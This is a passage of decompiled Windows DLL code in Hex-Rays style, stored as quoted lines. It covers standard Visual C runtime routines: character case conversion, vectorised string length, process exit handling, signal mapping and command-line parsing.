    "",
    "__int64 __fastcall sub_180021774(_BYTE *a1, _BYTE *a2, unsigned int a3)",
    "{",
    "  __int64 v7; // rbx",
    "  __int64 v8; // [rsp+40h] [rbp+8h] BYREF",
    "",
    "  if ( !a1 || !a2 || !*a2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0;",
    "  }",
    "  if ( !*a1 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    return 0;",
    "  }",
    "  sub_18002A7A8(&v8);",
    "  if ( !v8 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 24;",
    "    return 0;",
    "  }",
    "  v7 = sub_18002BDA4(a1, a2, a3);",
    "  if ( !v7 )",
    "    sub_18002A800(v8);",
    "  sub_18001747C(v8);",
    "  return v7;",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 __fastcall sub_180021830(_BYTE *a1, _BYTE *a2, unsigned int a3)",
    "{",
    "}__int64 __fastcall sub_180021838(unsigned int a1, __int128 *a2)",
    "{",
    "  unsigned int v2; // r8d",
    "  __int64 v4; // rdx",
    "  int v5; // ecx",
    "  _DWORD *v6; // rax",
    "  int v7; // eax",
    "  __int64 v9; // [rsp+50h] [rbp-20h] BYREF",
    "  __int64 v10; // [rsp+58h] [rbp-18h] BYREF",
    "  char v11; // [rsp+68h] [rbp-8h]",
    "  char v12; // [rsp+80h] [rbp+10h] BYREF",
    "  char v13; // [rsp+81h] [rbp+11h]",
    "  char v14; // [rsp+82h] [rbp+12h]",
    "  __int16 v15; // [rsp+90h] [rbp+20h] BYREF",
    "  char v16; // [rsp+92h] [rbp+22h]",
    "",
    "  v2 = -1;",
    "  if ( a1 != -1 )",
    "  {",
    "    sub_18001B674(&v9, a2);",
    "    if ( a1 >= 0x100 )",
    "    {",
    "      v4 = v10;",
    "      v14 = 0;",
    "      if ( *(int *)(v10 + 8) <= 1 || *(__int16 *)(*(_QWORD *)v10 + 2LL * BYTE1(a1)) >= 0 )",
    "      {",
    "        v6 = sub_18001A80C();",
    "        v5 = 1;",
    "        *v6 = 42;",
    "        v4 = v10;",
    "        v12 = a1;",
    "        v13 = 0;",
    "      }",
    "      else",
    "      {",
    "        v12 = BYTE1(a1);",
    "        v5 = 2;",
    "        v13 = a1;",
    "      }",
    "      v15 = 0;",
    "      v16 = 0;",
    "      v7 = sub_18002B9E0(",
    "             (unsigned int)&v10,",
    "             *(_QWORD *)(v4 + 312),",
    "             256,",
    "             (unsigned int)&v12,",
    "             v5,",
    "             (__int64)&v15,",
    "             3,",
    "             *(_DWORD *)(v4 + 12),",
    "             1);",
    "      if ( v7 )",
    "      {",
    "        v2 = (unsigned __int8)v15;",
    "        if ( v7 != 1 )",
    "          v2 = HIBYTE(v15) | ((unsigned __int8)v15 << 8);",
    "      }",
    "      else",
    "      {",
    "        v2 = a1;",
    "      }",
    "      if ( v11 )",
    "        *(_DWORD *)(v9 + 936) &= ~2u;",
    "    }",
    "    else",
    "    {",
    "      v2 = *(unsigned __int8 *)(*(_QWORD *)(v10 + 272) + (unsigned __int8)a1);",
    "      if ( v11 )",
    "        *(_DWORD *)(v9 + 936) &= ~2u;",
    "    }",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002196C(unsigned int a1)",
    "{",
    "  if ( dword_18004DC98 )",
    "  {",
    "    return (unsigned int)sub_180021838(a1, 0);",
    "  }",
    "  else if ( a1 - 65 <= 0x19 )",
    "  {",
    "    a1 += 32;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "// Microsoft VisualC v7/14 64bit runtime",
    "__int64 __fastcall unknown_libname_3(double a1)",
    "{",
    "}void  sub_1800219B0()",
    "{",
    "  if ( sub_18002BF04() )",
    "    sub_18002BF54(22);",
    "  if ( (byte_18004B2D0 & 2) != 0 )",
    "  {",
    "    if ( IsProcessorFeaturePresent(0x17u) )",
    "      __fastfail(7u);",
    "    sub_18001A398(3, 1073741845, 1);",
    "  }",
    "  sub_180022530(3);",
    "  JUMPOUT(0x180021A05LL);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180021A08(_BYTE *a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = 0;",
    "  if ( *a1 )",
    "  {",
    "    do",
    "    {",
    "      if ( result == a2 )",
    "        break;",
    "      ++result;",
    "    }",
    "    while ( a1[result] );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180021A20(_BYTE *a1, __int64 a2, __int64 a3, unsigned int a4)",
    "{",
    "  __int64 v7; // rax",
    "  __int64 result; // rax",
    "  int v9; // eax",
    "  __int64 v10; // rsi",
    "  DWORD LastError; // eax",
    "  __int64 v12; // rax",
    "  __int64 v13; // rdx",
    "  int v14; // eax",
    "",
    "  if ( !a1 )",
    "  {",
    "    if ( *(_BYTE *)(a2 + 40) )",
    "    {",
    "      sub_180023374(*(XSAVE_FORMAT **)(a2 + 16));",
    "      *(_BYTE *)(a2 + 40) = 0;",
    "    }",
    "    *(_QWORD *)(a2 + 16) = 0;",
    "    *(_QWORD *)(a2 + 24) = 0;",
    "    goto LABEL_5;",
    "  }",
    "  if ( *a1 )",
    "  {",
    "    v9 = sub_18002C1D0(a4, 9, a1);",
    "    v10 = v9;",
    "    if ( v9 )",
    "    {",
    "      if ( (unsigned __int64)v9 > *(_QWORD *)(a2 + 24) )",
    "      {",
    "        if ( *(_BYTE *)(a2 + 40) )",
    "        {",
    "          sub_180023374(*(XSAVE_FORMAT **)(a2 + 16));",
    "          *(_BYTE *)(a2 + 40) = 0;",
    "        }",
    "        v12 = sub_180024B50(2 * v10);",
    "        *(_QWORD *)(a2 + 16) = v12;",
    "        v13 = 0;",
    "        result = v12 == 0 ? 0xC : 0;",
    "        if ( !(_DWORD)result )",
    "          v13 = v10;",
    "        *(_BYTE *)(a2 + 40) = (_DWORD)result == 0;",
    "        *(_QWORD *)(a2 + 24) = v13;",
    "        if ( (_DWORD)result )",
    "          return result;",
    "      }",
    "      v14 = sub_18002C1D0(a4, 9, a1);",
    "      if ( v14 )",
    "      {",
    "        *(_QWORD *)(a2 + 32) = v14 - 1LL;",
    "        return 0;",
    "      }",
    "    }",
    "    LastError = GetLastError();",
    "    sub_18001A780(LastError);",
    "    return *(unsigned int *)sub_18001A80C();",
    "  }",
    "  if ( *(_QWORD *)(a2 + 24) )",
    "    goto LABEL_11;",
    "  if ( *(_BYTE *)(a2 + 40) )",
    "  {",
    "    sub_180023374(*(XSAVE_FORMAT **)(a2 + 16));",
    "    *(_BYTE *)(a2 + 40) = 0;",
    "  }",
    "  v7 = sub_180024B50(2);",
    "  *(_QWORD *)(a2 + 16) = v7;",
    "  result = v7 == 0 ? 0xC : 0;",
    "  *(_BYTE *)(a2 + 40) = (_DWORD)result == 0;",
    "  *(_QWORD *)(a2 + 24) = (_DWORD)result == 0;",
    "  if ( !(_DWORD)result )",
    "  {",
    "LABEL_11:",
    "    **(_WORD **)(a2 + 16) = 0;",
    "LABEL_5:",
    "    *(_QWORD *)(a2 + 32) = 0;",
    "    return 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180021B9C(_WORD *a1, __int64 a2, __int64 a3, int a4)",
    "{",
    "  int v6; // edi",
    "  __int64 result; // rax",
    "  int v8; // eax",
    "  DWORD LastError; // eax",
    "  unsigned __int64 v10; // rcx",
    "  int v11; // eax",
    "",
    "  v6 = (int)a1;",
    "  if ( !a1 )",
    "  {",
    "    if ( *(_BYTE *)(a2 + 40) )",
    "      *(_BYTE *)(a2 + 40) = 0;",
    "    *(_QWORD *)(a2 + 16) = 0;",
    "    *(_QWORD *)(a2 + 24) = 0;",
    "    goto LABEL_5;",
    "  }",
    "  if ( *a1 )",
    "  {",
    "    v8 = sub_18002C260(a4, 0, (_DWORD)a1, -1, 0, 0, 0, 0);",
    "    if ( v8 )",
    "    {",
    "      v10 = *(_QWORD *)(a2 + 24);",
    "      if ( v8 > v10 )",
    "      {",
    "        if ( *(_BYTE *)(a2 + 40) )",
    "          *(_BYTE *)(a2 + 40) = 0;",
    "        goto LABEL_10;",
    "      }",
    "      v11 = sub_18002C260(a4, 0, v6, -1, *(_QWORD *)(a2 + 16), v10, 0, 0);",
    "      if ( v11 )",
    "      {",
    "        *(_QWORD *)(a2 + 32) = v11 - 1LL;",
    "        return 0;",
    "      }",
    "    }",
    "    LastError = GetLastError();",
    "    sub_18001A780(LastError);",
    "    return *(unsigned int *)sub_18001A80C();",
    "  }",
    "  if ( !*(_QWORD *)(a2 + 24) )",
    "  {",
    "    if ( *(_BYTE *)(a2 + 40) )",
    "      *(_BYTE *)(a2 + 40) = 0;",
    "LABEL_10:",
    "    *(_DWORD *)sub_18001A80C() = 34;",
    "    result = 34;",
    "    *(_BYTE *)(a2 + 40) = 0;",
    "    *(_QWORD *)(a2 + 24) = 0;",
    "    return result;",
    "  }",
    "  **(_BYTE **)(a2 + 16) = 0;",
    "LABEL_5:",
    "  *(_QWORD *)(a2 + 32) = 0;",
    "  return 0;",
    "}",
    "",
    "",
    "char *__fastcall sub_180021CB8(__m128i *a1, unsigned __int64 a2)",
    "{",
    "  __m128i *v4; // r9",
    "  unsigned __int64 v5; // r10",
    "  __m128i *v6; // rax",
    "  __m128i *v7; // rcx",
    "  _BYTE *v8; // rcx",
    "  __m128i *v9; // r8",
    "  unsigned __int64 v11; // r10",
    "  __m128i *v12; // rax",
    "  __m128i *v13; // rcx",
    "  __m128i *v14; // r8",
    "  __m128i *i; // rax",
    "",
    "  v4 = a1;",
    "  if ( dword_18004B0D0 < 5 )",
    "  {",
    "    if ( dword_18004B0D0 < 1 )",
    "    {",
    "      for ( i = (__m128i *)((char *)a1 + a2); a1 != i; a1 = (__m128i *)((char *)a1 + 1) )",
    "      {",
    "        if ( !a1->m128i_i8[0] )",
    "          break;",
    "      }",
    "      return (char *)((char *)a1 - (char *)v4);",
    "    }",
    "    v11 = (16LL - ((unsigned __int8)a1 & 0xF)) & -(__int64)(((unsigned __int8)a1 & 0xF) != 0);",
    "    v12 = a1;",
    "    if ( a2 < v11 )",
    "      v11 = a2;",
    "    v13 = (__m128i *)((char *)a1 + v11);",
    "    if ( v4 != (__m128i *)&v4->m128i_i8[v11] )",
    "    {",
    "      do",
    "      {",
    "        if ( !v12->m128i_i8[0] )",
    "          break;",
    "        v12 = (__m128i *)((char *)v12 + 1);",
    "      }",
    "      while ( v12 != v13 );",
    "    }",
    "    v8 = (_BYTE *)((char *)v12 - (char *)v4);",
    "    if ( (char *)v12 - (char *)v4 == v11 )",
    "    {",
    "      a1 = v12;",
    "      v14 = (__m128i *)((char *)v12 + ((a2 - v11) & 0xFFFFFFFFFFFFFFF0uLL));",
    "      if ( v12 != v14 )",
    "      {",
    "        do",
    "        {",
    "          if ( _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *a1)) )",
    "            break;",
    "          ++a1;",
    "        }",
    "        while ( a1 != v14 );",
    "      }",
    "      while ( a1 != (__m128i *)&v4->m128i_i8[a2] && a1->m128i_i8[0] )",
    "        a1 = (__m128i *)((char *)a1 + 1);",
    "      return (char *)((char *)a1 - (char *)v4);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v5 = (32LL - ((unsigned __int8)a1 & 0x1F)) & -(__int64)(((unsigned __int8)a1 & 0x1F) != 0);",
    "    v6 = a1;",
    "    if ( a2 < v5 )",
    "      v5 = a2;",
    "    v7 = (__m128i *)((char *)a1 + v5);",
    "    if ( v4 != v7 )",
    "    {",
    "      do",
    "      {",
    "        if ( !v6->m128i_i8[0] )",
    "          break;",
    "        v6 = (__m128i *)((char *)v6 + 1);",
    "      }",
    "      while ( v6 != v7 );",
    "    }",
    "    v8 = (_BYTE *)((char *)v6 - (char *)v4);",
    "    if ( (char *)v6 - (char *)v4 == v5 )",
    "    {",
    "      a1 = v6;",
    "      v9 = (__m128i *)((char *)v6 + ((a2 - v5) & 0xFFFFFFFFFFFFFFE0uLL));",
    "      if ( v6 != v9 )",
    "      {",
    "        do",
    "        {",
    "          __asm",
    "          {",
    "            vpxor   xmm1, xmm1, xmm1",
    "            vpcmpeqb ymm1, ymm1, ymmword ptr [rcx]",
    "            vpmovmskb eax, ymm1",
    "          }",
    "          __asm { vzeroupper }",
    "          if ( _EAX )",
    "            break;",
    "          a1 += 2;",
    "        }",
    "        while ( a1 != v9 );",
    "      }",
    "      while ( a1 != (__m128i *)&v4->m128i_i8[a2] && a1->m128i_i8[0] )",
    "        a1 = (__m128i *)((char *)a1 + 1);",
    "      return (char *)((char *)a1 - (char *)v4);",
    "    }",
    "  }",
    "  return v8;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180021E08(__m128i *a1, unsigned __int64 a2)",
    "{",
    "  __m128i *v5; // rax",
    "  __m128i *i; // rdx",
    "  __m128i *v7; // rdx",
    "  unsigned __int64 v8; // r11",
    "  __m128i *v9; // rax",
    "  __int64 v10; // rdx",
    "  __m128i *v11; // r9",
    "  __m128i *j; // rdx",
    "  __m128i *v14; // rax",
    "  __m128i *v15; // rdx",
    "  unsigned __int64 v16; // r11",
    "  __m128i *v17; // rax",
    "  __m128i *v18; // rdx",
    "  __m128i *v19; // rax",
    "",
    "  if ( dword_18004B0D0 < 5 )",
    "  {",
    "    if ( dword_18004B0D0 < 1 )",
    "    {",
    "      v19 = (__m128i *)((char *)a1 + 2 * a2);",
    "      for ( i = a1; i != v19; i = (__m128i *)((char *)i + 2) )",
    "      {",
    "        if ( !i->m128i_i16[0] )",
    "          break;",
    "      }",
    "      return ((char *)i - (char *)a1) >> 1;",
    "    }",
    "    if ( ((unsigned __int8)a1 & 1) != 0 )",
    "    {",
    "      v14 = (__m128i *)((char *)a1 + 2 * a2);",
    "      for ( i = a1; i != v14; i = (__m128i *)((char *)i + 2) )",
    "      {",
    "        if ( !i->m128i_i16[0] )",
    "          break;",
    "      }",
    "      return ((char *)i - (char *)a1) >> 1;",
    "    }",
    "    v15 = a1;",
    "    v16 = ((16LL - ((unsigned __int8)a1 & 0xF)) & (unsigned __int64)-(__int64)(((unsigned __int8)a1 & 0xF) != 0)) >> 1;",
    "    if ( a2 < v16 )",
    "      v16 = a2;",
    "    v17 = (__m128i *)((char *)a1 + 2 * v16);",
    "    if ( a1 != v17 )",
    "    {",
    "      do",
    "      {",
    "        if ( !v15->m128i_i16[0] )",
    "          break;",
    "        v15 = (__m128i *)((char *)v15 + 2);",
    "      }",
    "      while ( v15 != v17 );",
    "    }",
    "    v10 = ((char *)v15 - (char *)a1) >> 1;",
    "    if ( v10 == v16 )",
    "    {",
    "      v11 = (__m128i *)((char *)a1 + 2 * v10);",
    "      v18 = (__m128i *)((char *)a1 + 2 * v10 + 2 * ((a2 - v16) & 0xFFFFFFFFFFFFFFF0uLL));",
    "      while ( v11 != v18 && !_mm_movemask_epi8(_mm_cmpeq_epi16((__m128i)0LL, *v11)) )",
    "        ++v11;",
    "      while ( v11 != (__m128i *)((char *)a1 + 2 * a2) && v11->m128i_i16[0] )",
    "        v11 = (__m128i *)((char *)v11 + 2);",
    "LABEL_20:",
    "      i = v11;",
    "      return ((char *)i - (char *)a1) >> 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    if ( ((unsigned __int8)a1 & 1) != 0 )",
    "    {",
    "      v5 = (__m128i *)((char *)a1 + 2 * a2);",
    "      for ( i = a1; i != v5; i = (__m128i *)((char *)i + 2) )",
    "      {",
    "        if ( !i->m128i_i16[0] )",
    "          break;",
    "      }",
    "      return ((char *)i - (char *)a1) >> 1;",
    "    }",
    "    v7 = a1;",
    "    v8 = ((32LL - ((unsigned __int8)a1 & 0x1F)) & (unsigned __int64)-(__int64)(((unsigned __int8)a1 & 0x1F) != 0)) >> 1;",
    "    if ( a2 < v8 )",
    "      v8 = a2;",
    "    v9 = (__m128i *)((char *)a1 + 2 * v8);",
    "    if ( a1 != v9 )",
    "    {",
    "      do",
    "      {",
    "        if ( !v7->m128i_i16[0] )",
    "          break;",
    "        v7 = (__m128i *)((char *)v7 + 2);",
    "      }",
    "      while ( v7 != v9 );",
    "    }",
    "    v10 = ((char *)v7 - (char *)a1) >> 1;",
    "    if ( v10 == v8 )",
    "    {",
    "      v11 = (__m128i *)((char *)a1 + 2 * v10);",
    "      for ( j = (__m128i *)((char *)a1 + 2 * v10 + 2 * ((a2 - v8) & 0xFFFFFFFFFFFFFFE0uLL)); v11 != j; v11 += 2 )",
    "      {",
    "        __asm",
    "        {",
    "          vpxor   xmm1, xmm1, xmm1",
    "          vpcmpeqw ymm1, ymm1, ymmword ptr [r9]",
    "          vpmovmskb eax, ymm1",
    "        }",
    "        __asm { vzeroupper }",
    "        if ( _EAX )",
    "          break;",
    "      }",
    "      while ( v11 != (__m128i *)((char *)a1 + 2 * a2) && v11->m128i_i16[0] )",
    "        v11 = (__m128i *)((char *)v11 + 2);",
    "      goto LABEL_20;",
    "    }",
    "  }",
    "  return v10;",
    "}",
    "",
    "",
    "unsigned int (__fastcall *__fastcall sub_180021FE8(__int64 a1))(__int64)",
    "{",
    "  unsigned int (__fastcall *result)(__int64); // rax",
    "  unsigned int v3; // ebx",
    "",
    "  result = (unsigned int (__fastcall *)(__int64))sub_180022028();",
    "  v3 = 0;",
    "  if ( result )",
    "  {",
    "    LOBYTE(v3) = result(a1) != 0;",
    "    return (unsigned int (__fastcall *)(__int64))v3;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_180022028()",
    "{",
    "  __int64 v0; // rbx",
    "",
    "  sub_1800209E8(0);",
    "  v0 = __ROR8__(_security_cookie ^ qword_18004D538, _security_cookie & 0x3F);",
    "  sub_180020A3C(0);",
    "  return v0;",
    "}",
    "",
    "",
    "void __fastcall sub_180022060(void (**a1)(void), void (**a2)(void))",
    "{",
    "  void (**v3)(void); // rbx",
    "",
    "  if ( a1 != a2 )",
    "  {",
    "    v3 = a1;",
    "    do",
    "    {",
    "      if ( *v3 )",
    "        (*v3)();",
    "      ++v3;",
    "    }",
    "    while ( v3 != a2 );",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800220A4(__int64 (**a1)(void), __int64 (**a2)(void))",
    "{",
    "  __int64 (**v3)(void); // rbx",
    "  bool i; // zf",
    "  __int64 result; // rax",
    "",
    "  v3 = a1;",
    "  for ( i = a1 == a2; !i; i = v3 == a2 )",
    "  {",
    "    if ( *v3 )",
    "    {",
    "      result = (*v3)();",
    "      if ( (_DWORD)result )",
    "        return result;",
    "    }",
    "    ++v3;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022100(int a1, __int64 a2)",
    "{",
    "  _QWORD *v4; // rax",
    "  _QWORD *v5; // rbx",
    "  __int64 v6; // rcx",
    "  __int64 v7; // rax",
    "  void (__fastcall *v9)(_QWORD); // r8",
    "  __int64 v10; // rbp",
    "  __int64 v11; // rcx",
    "  __int64 v12; // rdx",
    "  unsigned int v13; // edi",
    "  __int64 v14; // rdx",
    "",
    "  v4 = (_QWORD *)sub_180026474();",
    "  v5 = v4;",
    "  if ( !v4 )",
    "    return 0;",
    "  v6 = *v4;",
    "  v7 = *v4;",
    "  while ( *(_DWORD *)v7 != a1 )",
    "  {",
    "    v7 += 16;",
    "    if ( v7 == v6 + 192 )",
    "      return 0;",
    "  }",
    "  if ( !v7 )",
    "    return 0;",
    "  v9 = *(void (__fastcall **)(_QWORD))(v7 + 8);",
    "  if ( !v9 )",
    "    return 0;",
    "  if ( v9 == (void (__fastcall *)(_QWORD))5 )",
    "  {",
    "    *(_QWORD *)(v7 + 8) = 0;",
    "    return 1;",
    "  }",
    "  if ( v9 != (void (__fastcall *)(_QWORD))1 )",
    "  {",
    "    v10 = v5[1];",
    "    v5[1] = a2;",
    "    if ( *(_DWORD *)(v7 + 4) != 8 )",
    "    {",
    "      *(_QWORD *)(v7 + 8) = 0;",
    "      v9(*(unsigned int *)(v7 + 4));",
    "      goto LABEL_37;",
    "    }",
    "    v11 = v6 + 48;",
    "    v12 = v11 + 144;",
    "    while ( v11 != v12 )",
    "    {",
    "      *(_QWORD *)(v11 + 8) = 0;",
    "      v11 += 16;",
    "    }",
    "    v13 = *((_DWORD *)v5 + 4);",
    "    switch ( *(_DWORD *)v7 )",
    "    {",
    "      case 0xC000008D:",
    "        v14 = 130;",
    "        break;",
    "      case 0xC000008E:",
    "        v14 = 131;",
    "        break;",
    "      case 0xC000008F:",
    "        v14 = 134;",
    "        break;",
    "      case 0xC0000090:",
    "        v14 = 129;",
    "        break;",
    "      case 0xC0000091:",
    "        v14 = 132;",
    "        break;",
    "      case 0xC0000092:",
    "        v14 = 138;",
    "        break;",
    "      case 0xC0000093:",
    "        v14 = 133;",
    "        break;",
    "      case 0xC00002B4:",
    "        v14 = 142;",
    "        break;",
    "      default:",
    "        v14 = v13;",
    "        if ( *(_DWORD *)v7 != -1073741131 )",
    "        {",
    "LABEL_35:",
    "          ((void (__fastcall *)(__int64, __int64, void (__fastcall *)(_QWORD), _QWORD))v9)(8, v14, v9, 0);",
    "          *((_DWORD *)v5 + 4) = v13;",
    "LABEL_37:",
    "          v5[1] = v10;",
    "          return 0xFFFFFFFFLL;",
    "        }",
    "        v14 = 141;",
    "        break;",
    "    }",
    "    *((_DWORD *)v5 + 4) = v14;",
    "    goto LABEL_35;",
    "  }",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "void __fastcall sub_180022284(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  sub_1800209E8(*a2);",
    "  sub_1800222BC(a3);",
    "  sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "int *__fastcall sub_1800222BC(int **a1)",
    "{",
    "  int v2; // ecx",
    "  void *v3; // rcx",
    "  int *result; // rax",
    "",
    "  if ( byte_18004D550 )",
    "    return result;",
    "  _InterlockedExchange(&dword_18004D540, 1);",
    "  v2 = **a1;",
    "  if ( !v2 )",
    "  {",
    "    if ( qword_18004D548 != _security_cookie )",
    "      ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))__ROR8__(",
    "                                                      qword_18004D548 ^ _security_cookie,",
    "                                                      _security_cookie & 0x3F))(",
    "        0,",
    "        0,",
    "        0);",
    "    v3 = &unk_18004D688;",
    "    goto LABEL_8;",
    "  }",
    "  if ( v2 == 1 )",
    "  {",
    "    v3 = &unk_18004D6A0;",
    "LABEL_8:",
    "    sub_180022E98(v3);",
    "  }",
    "  if ( !**a1 )",
    "    sub_180022060(&qword_180039468, &qword_180039488);",
    "  sub_180022060(&qword_180039490, &qword_180039498);",
    "  result = a1[1];",
    "  if ( !*result )",
    "  {",
    "    byte_18004D550 = 1;",
    "    result = a1[2];",
    "    *(_BYTE *)result = 1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180022388(UINT a1, int a2, int a3)",
    "{",
    "  HMODULE ModuleHandleW; // rax",
    "  char *v5; // rcx",
    "  _BYTE v6[4]; // [rsp+20h] [rbp-30h] BYREF",
    "  int v7; // [rsp+24h] [rbp-2Ch] BYREF",
    "  int v8; // [rsp+28h] [rbp-28h] BYREF",
    "  __int64 v9; // [rsp+30h] [rbp-20h]",
    "  _QWORD v10[3]; // [rsp+38h] [rbp-18h] BYREF",
    "  int v11; // [rsp+68h] [rbp+18h] BYREF",
    "  int v12; // [rsp+70h] [rbp+20h] BYREF",
    "  char v13; // [rsp+78h] [rbp+28h] BYREF",
    "",
    "  v12 = a3;",
    "  v11 = a2;",
    "  v9 = -2;",
    "  if ( !a3 )",
    "  {",
    "    ModuleHandleW = GetModuleHandleW(0);",
    "    if ( ModuleHandleW )",
    "    {",
    "      if ( *(_WORD *)ModuleHandleW == 23117 )",
    "      {",
    "        v5 = (char *)ModuleHandleW + *((int *)ModuleHandleW + 15);",
    "        if ( *(_DWORD *)v5 == 17744 && *((_WORD *)v5 + 12) == 523 && *((_DWORD *)v5 + 33) > 0xEu && *((_DWORD *)v5 + 62) )",
    "          sub_1800224A8(a1);",
    "      }",
    "    }",
    "  }",
    "  v13 = 0;",
    "  v10[0] = &v11;",
    "  v10[1] = &v12;",
    "  v10[2] = &v13;",
    "  v7 = 2;",
    "  v8 = 2;",
    "  sub_180022284((__int64)v6, &v8, (__int64)v10, &v7);",
    "  if ( !v12 )",
    "    sub_180022450(a1);",
    "}",
    "",
    "",
    "void __fastcall  sub_180022450(UINT uExitCode)",
    "{",
    "  HANDLE CurrentProcess; // rax",
    "",
    "  if ( (unsigned __int8)sub_180022484() )",
    "  {",
    "    CurrentProcess = GetCurrentProcess();",
    "    TerminateProcess(CurrentProcess, uExitCode);",
    "  }",
    "  sub_1800224A8(uExitCode);",
    "  ExitProcess(uExitCode);",
    "}",
    "",
    "",
    "bool sub_180022484()",
    "{",
    "  return (unsigned int)sub_18002C580() != 1 && (unsigned __int8)sub_18002C54C() == 0;",
    "}",
    "",
    "",
    "int __fastcall sub_1800224A8(unsigned int a1)",
    "{",
    "  FARPROC CorExitProcess; // rax",
    "  HMODULE v3; // rcx",
    "  HMODULE phModule; // [rsp+48h] [rbp+10h] BYREF",
    "",
    "  phModule = 0;",
    "  LODWORD(CorExitProcess) = GetModuleHandleExW(0, (LPCWSTR)L\"mscoree.dll\", &phModule);",
    "  v3 = phModule;",
    "  if ( (_DWORD)CorExitProcess )",
    "  {",
    "    CorExitProcess = GetProcAddress(phModule, \"CorExitProcess\");",
    "    if ( CorExitProcess )",
    "      LODWORD(CorExitProcess) = ((__int64 (__fastcall *)(_QWORD))CorExitProcess)(a1);",
    "    v3 = phModule;",
    "  }",
    "  if ( v3 )",
    "    LODWORD(CorExitProcess) = FreeLibrary(v3);",
    "  return (int)CorExitProcess;",
    "}",
    "",
    "",
    "void __cdecl cexit()",
    "{",
    "  sub_180022388(0, 0, 1);",
    "}",
    "",
    "",
    "void __fastcall sub_180022530(UINT a1)",
    "{",
    "  sub_180022388(a1, 2, 0);",
    "}",
    "",
    "",
    "__int64 sub_18002253C()",
    "{",
    "  return (unsigned int)dword_18004D540;",
    "}",
    "",
    "",
    "char __fastcall sub_180022544(char *a1, char **a2, char *a3, _QWORD *a4, _QWORD *a5)",
    "{",
    "  char *v6; // rbx",
    "  char **v7; // r14",
    "  bool v9; // bp",
    "  char *v10; // r15",
    "  unsigned int v11; // esi",
    "  bool v12; // si",
    "  char result; // al",
    "  int v14; // edx",
    "  unsigned int v15; // eax",
    "  char v16; // al",
    "",
    "  v6 = a3;",
    "  v7 = a2;",
    "  *a5 = 0;",
    "  *a4 = 1;",
    "  if ( a2 )",
    "  {",
    "    *a2 = a3;",
    "    v7 = a2 + 1;",
    "  }",
    "  v9 = 0;",
    "  do",
    "  {",
    "    v10 = a1;",
    "    if ( *a1 == 34 )",
    "    {",
    "      LOBYTE(v11) = 34;",
    "      v9 = !v9;",
    "      ++a1;",
    "    }",
    "    else",
    "    {",
    "      ++*a5;",
    "      if ( v6 )",
    "        *v6++ = *a1;",
    "      v11 = *a1++;",
    "      if ( (unsigned int)sub_18002DB3C(v11) )",
    "      {",
    "        ++*a5;",
    "        if ( v6 )",
    "          *v6++ = *a1;",
    "        a1 = v10 + 2;",
    "      }",
    "      if ( !(_BYTE)v11 )",
    "      {",
    "        --a1;",
    "        goto LABEL_19;",
    "      }",
    "    }",
    "  }",
    "  while ( v9 || (_BYTE)v11 != 32 && (_BYTE)v11 != 9 );",
    "  if ( v6 )",
    "    *(v6 - 1) = 0;",
    "LABEL_19:",
    "  v12 = 0;",
    "  while ( 1 )",
    "  {",
    "    result = *a1;",
    "    if ( !*a1 )",
    "      break;",
    "    while ( result == 32 || result == 9 )",
    "      result = *++a1;",
    "    if ( !result )",
    "      break;",
    "    if ( v7 )",
    "      *v7++ = v6;",
    "    ++*a4;",
    "    while ( 1 )",
    "    {",
    "      v14 = 1;",
    "      v15 = 0;",
    "      while ( *a1 == 92 )",
    "      {",
    "        ++a1;",
    "        ++v15;",
    "      }",
    "      if ( *a1 == 34 )",
    "      {",
    "        if ( (v15 & 1) == 0 )",
    "        {",
    "          if ( v12 && a1[1] == 34 )",
    "          {",
    "            ++a1;",
    "          }",
    "          else",
    "          {",
    "            v14 = 0;",
    "            v12 = !v12;",
    "          }",
    "        }",
    "        v15 >>= 1;",
    "      }",
    "      while ( v15 )",
    "      {",
    "        --v15;",
    "        if ( v6 )",
    "          *v6++ = 92;",
    "        ++*a5;",
    "      }",
    "      v16 = *a1;",
    "      if ( !*a1 || !v12 && (v16 == 32 || v16 == 9) )",
    "        break;",
    "      if ( v14 )",
    "      {",
    "        if ( v6 )",
    "          *v6++ = v16;",
    "        if ( (unsigned int)sub_18002DB3C((unsigned int)*a1) )",
    "        {",
    "          ++*a5;",
    "          ++a1;",
    "          if ( v6 )",
    "            *v6++ = *a1;",
    "        }",
    "        ++*a5;",
    "      }",
    "      ++a1;",
    "    }",
    "    if ( v6 )",
    "      *v6++ = 0;",
    "    ++*a5;",
    "  }",
    "  if ( v7 )",
    "    *v7 = 0;",
    "  ++*a4;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002270C(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)",
    "{",
    "  __int64 v3; // rcx",
    "  __int64 v4; // rbx",
    "",
    "  if ( a1 >= 0x1FFFFFFFFFFFFFFFLL )",
    "    return 0;",
    "  if ( a2 >= 0xFFFFFFFFFFFFFFFFuLL / a3 )",
    "    return 0;",
    "  v3 = 8 * a1;",
    "  if ( ~v3 <= a3 * a2 )",
    "    return 0;",
    "  v4 = sub_1800232FC(a3 * a2 + v3, 1);",
    "  sub_180023374(0);",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002276C(int a1)",
